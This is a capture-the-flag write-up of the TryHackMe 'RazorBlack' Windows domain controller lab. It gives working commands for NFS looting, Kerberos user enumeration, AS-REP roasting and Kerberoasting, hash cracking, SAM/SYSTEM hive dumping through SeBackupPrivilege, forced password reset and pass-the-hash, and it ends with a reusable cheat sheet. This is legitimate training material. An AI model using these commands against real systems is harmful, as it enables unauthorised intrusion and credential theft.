# RazorBlack - TryHackMe

> **Kill Chain Summary**:
> Full Network Reconnaissance (DNS 53, Kerberos 88, LDAP 389, SMB 445, NFS 2049, WinRM 5985) -> Domain Controller Fingerprinting (`raz0rblack.thm`) -> Unauthenticated NFS Export Mounting (`/users`) -> Employee List Extraction (`employee_status.xlsx` and Flag 1) -> Kerbrute User Validation -> AS-REP Roasting via Impacket (`twilliams`) -> Offline Ticket Cracking with Hashcat (`roastpotatoes`) -> Domain-Authenticated Kerberoasting -> TGS Cracking for Service Account `xyan1d3` (`cyanide9amine5628`) -> WinRM Remote Shell -> PSCredential XML Decryption via DPAPI (`xyan1d3.xml`) -> User Flag Captured -> Privilege Enumeration (`SeBackupPrivilege Enabled`) -> SAM and SYSTEM Registry Hive Dumping -> Exfiltration via SYSVOL Share -> Offline NTLM Extraction via secretsdump -> Administrator Pass-The-Hash with Evil-WinRM -> Root Flag Extraction via Hex Decoding (`root.xml`).

| Property | Value |
| :--- | :--- |
| **Target Name** | RazorBlack |
| **Platform** | TryHackMe |
| **OS** | Windows Server (Domain Controller) |
| **Difficulty** | Medium / Hard |
| **Status** | Rooted |
| **Key Techniques** | NFS Enumeration, AS-REP Roasting, Kerberoasting, WinRM, PSCredential DPAPI Decryption, SeBackupPrivilege, SAM/SYSTEM Exfiltration, Pass-The-Hash |

---

## 1. Reconnaissance and Enumeration

### 1.1 Port Scanning

A full TCP SYN port scan was performed using Nmap:

```bash
sudo nmap -p- -sS --min-rate 1000 -T4 -Pn 10.10.175.60
```

**Open Ports:**
- **Port 53:** Microsoft DNS
- **Port 88:** Kerberos authentication
- **Port 135:** Microsoft RPC Endpoint Mapper
- **Port 139 / 445:** Microsoft SMB
- **Port 389 / 636:** LDAP / LDAPS
- **Port 2049:** Network File System (NFS)
- **Port 3389:** Remote Desktop (RDP)
- **Port 5985:** Windows Remote Management (WinRM)

The port profile confirms an Active Directory Domain Controller:
- **FQDN:** `raz0rblack.thm`
- **Domain Controller Name:** `HAVEN-DC`

Add the domain and hostname to `/etc/hosts`:

```bash
echo "10.10.175.60 raz0rblack.thm haven-dc.raz0rblack.thm" | sudo tee -a /etc/hosts
```

### 1.2 NFS Share Enumeration & Data Extraction

Listing exported NFS shares:

```bash
showmount -e 10.10.175.60
```

```text
Export list for 10.10.175.60:
/users (everyone)
```

The `/users` directory is exported and mountable by any remote host.

Create a local mount point and mount the export:

```bash
mkdir /tmp/nfs_mount
sudo mount -t nfs 10.10.175.60:/users /tmp/nfs_mount -nolock
ls -la /tmp/nfs_mount
```

Files extracted:
1. `sbradley.txt`: Contains the first challenge flag.
2. `employee_status.xlsx`: An Excel spreadsheet detailing employee records.

Retrieve Flag 1:

```bash
cat /tmp/nfs_mount/sbradley.txt
```

```text
[FLAG REDACTED]
```

Parsing the employee names from the spreadsheet enables constructing a targeted Active Directory username list (`users.txt`) adhering to common Windows naming conventions (`<first_initial><last_name>`).

---

## 2. Initial Access

### 2.1 Kerbrute User Validation

Validate generated usernames against Kerberos:

```bash
./kerbrute userenum -d raz0rblack.thm --dc 10.10.175.60 users.txt
```

Confirmed valid domain users:
- `lvetrova`
- `twilliams`
- `sbradley`

### 2.2 AS-REP Roasting

Query the KDC for accounts configured with `UF_DONT_REQUIRE_PREAUTH`:

```bash
impacket-GetNPUsers raz0rblack.thm/ -dc-ip 10.10.175.60 -usersfile valid_users.txt -request -format hashcat
```

The account `twilliams` returns a valid AS-REP Kerberos ticket:

```text
$krb5asrep$23$twilliams@raz0rblack.thm:...
```

Crack the ticket using Hashcat mode 18200:

```bash
hashcat -m 18200 -a 0 asrep_hash.txt /usr/share/wordlists/rockyou.txt
```

```text
$krb5asrep$23$twilliams@raz0rblack.thm:...:roastpotatoes
```

Recovered credentials:
- **Username:** `twilliams`
- **Password:** `roastpotatoes`

---

## 3. Privilege Escalation

### 3.1 Kerberoasting

Having acquired authenticated domain credentials for `twilliams`, query the domain for registered Service Principal Names (SPNs):

```bash
impacket-GetUserSPNs raz0rblack.thm/twilliams:roastpotatoes -dc-ip 10.10.175.60 -request
```

```text
ServicePrincipalName    Name      MemberOf
--------------------    ----      --------
vuln/service            xyan1d3   CN=Remote Management Users,...
$krb5tgs$23$*xyan1d3$...
```

The service account `xyan1d3` has an associated SPN and returns a TGS hash.

Crack the TGS ticket with Hashcat mode 13100:

```bash
hashcat -m 13100 -a 0 tgs_hash.txt /usr/share/wordlists/rockyou.txt
```

```text
$krb5tgs$23$*xyan1d3*...:cyanide9amine5628
```

Recovered service account credentials:
- **Username:** `xyan1d3`
- **Password:** `cyanide9amine5628`

### 3.2 WinRM Access and PSCredential Decryption

User `xyan1d3` belongs to the `Remote Management Users` group. Establish an interactive session via Evil-WinRM:

```bash
evil-winrm -i 10.10.175.60 -u 'xyan1d3' -p 'cyanide9amine5628'
```

Navigating to the user's home directory reveals `xyan1d3.xml`. The file stores a serialized **PSCredential** object encrypted via DPAPI under `xyan1d3`'s user master key.

Decrypt the object directly within PowerShell:

```powershell
$creds = Import-Clixml -Path .\xyan1d3.xml
$creds.GetNetworkCredential().password
```

The output reveals the user flag:

```text
[FLAG REDACTED]
```

---

### Privilege Escalation

### 4.1 Token Privilege Enumeration: SeBackupPrivilege

Inspect security tokens assigned to `xyan1d3`:

```powershell
whoami /priv
```

```text
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Enabled 
SeRestorePrivilege            Restore files and directories  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
```

`SeBackupPrivilege` is enabled.

> [!NOTE] Concept: SeBackupPrivilege Registry Hive Dumping
> `SeBackupPrivilege` bypasses standard filesystem and registry Access Control Lists (ACLs) to allow system backups. An attacker can create copies of the active SAM and SYSTEM registry hives using `reg save`, exfiltrate them, and extract all local account password hashes offline.

### 4.2 Dumping SAM and SYSTEM Registry Hives

Export the registry hives to local disk:

```cmd
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
```

### 4.3 Hive Exfiltration

Two distinct exfiltration paths were verified:

#### Method A: Exfiltration via SYSVOL Share
Copy the exported hives into the domain's SYSVOL share, which permits authenticated read access:

```powershell
Move-Item C:\Temp\SAM \\127.0.0.1\SYSVOL\raz0rblack.thm\SAM
Move-Item C:\Temp\SYSTEM \\127.0.0.1\SYSVOL\raz0rblack.thm\SYSTEM
```

Download the files onto the Kali attack machine:

```bash
smbclient //10.10.175.60/SYSVOL -U xyan1d3 -c "get SAM; get SYSTEM"
```

#### Method B: Exfiltration via Trash Share and Account Password Reset
Alternatively, move the hives into the local `C:\Windows\trash` directory:

```powershell
Move-Item C:\Temp\SAM C:\Windows\trash\SAM
Move-Item C:\Temp\SYSTEM C:\Windows\trash\SYSTEM
```

Because user `sbradley` has an expired password flag set, update their domain password using `smbpasswd.py`:

```bash
python3 smbpasswd.py sbradley@10.10.175.60 -new 'Password123!'
```

Download the hives authenticated as `sbradley`:

```bash
smbclient //10.10.175.60/trash -U sbradley -c "get SAM; get SYSTEM"
```

### 4.4 Offline Extraction & Pass-The-Hash

On Kali, dump local password hashes from the exfiltrated hives using `impacket-secretsdump`:

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

```text
[*] Target system bootKey: 0x228...
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9689931bed40ca5a2ce1218210177f0c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

The Administrator NTLM hash is recovered:
- **Hash:** `9689931bed40ca5a2ce1218210177f0c`

Authenticate as Domain Administrator using Pass-The-Hash via Evil-WinRM:

```bash
evil-winrm -i 10.10.175.60 -u 'Administrator' -H '9689931bed40ca5a2ce1218210177f0c'
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
raz0rblack\administrator
```

### 4.5 Root Flag Extraction (Hex-Encoded XML Secret)

In `C:\Users\Administrator\Desktop`, the root flag is stored in `root.xml`.

Attempting to run `Import-Clixml` fails because Pass-The-Hash authentication does not initialize the Administrator's DPAPI master key.

Inspecting the raw text of `root.xml` reveals that the credential's password string is serialized as hexadecimal byte pairs:

```powershell
type C:\Users\Administrator\Desktop\root.xml
```

Extract the hexadecimal string and decode it on Kali:

```bash
echo "<HEX_STRING>" | xxd -r -p
```

The decoded text reveals the final root flag:

```text
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# Mount Unauthenticated Remote NFS Export
sudo mount -t nfs <TARGET_IP>:/<EXPORT> /tmp/mountpoint -nolock

# Kerbrute Username Enumeration
./kerbrute userenum -d <DOMAIN> --dc <DC_IP> <USER_LIST>

# AS-REP Roasting Ticket Extraction
impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -usersfile <USER_LIST> -request

# Kerberoasting Service Account Tickets
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request

# Backup Registry Hives
reg save HKLM\SAM SAM
reg save HKLM\SYSTEM SYSTEM

# Offline SAM Hash Extraction
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Evil-WinRM Pass-The-Hash
evil-winrm -i <DC_IP> -u Administrator -H <NTLM_HASH>
```

---

## 5. Key Takeaways and Lessons Learned

1. **Active Directory Attack Chaining:** RazorBlack exemplifies the standard AD kill chain: anonymous information discovery (NFS) -> user enumeration (Kerbrute) -> unauthenticated ticketing (AS-REP Roasting) -> authenticated ticketing (Kerberoasting) -> administrative privilege escalation.
2. **SeBackupPrivilege Weaponization:** Accounts with `SeBackupPrivilege` can bypass access controls on critical hives (`SAM`, `SYSTEM`, `NTDS.dit`). Extracting these hives locally and copying them to network shares provides complete offline hash extraction.
3. **DPAPI Limitations in Pass-The-Hash:** Pass-The-Hash sessions lack the plaintext user password required to unlock DPAPI master keys. When `Import-Clixml` fails on serialized PSCredential objects, inspect the raw XML for plain hex or base64 data structures.

---

#tryhackme #windows #active-directory #nfs #kerbrute #as-rep-roasting #kerberoasting #winrm #pscredential #sebackupprivilege #secretsdump #pass-the-hash #privesc
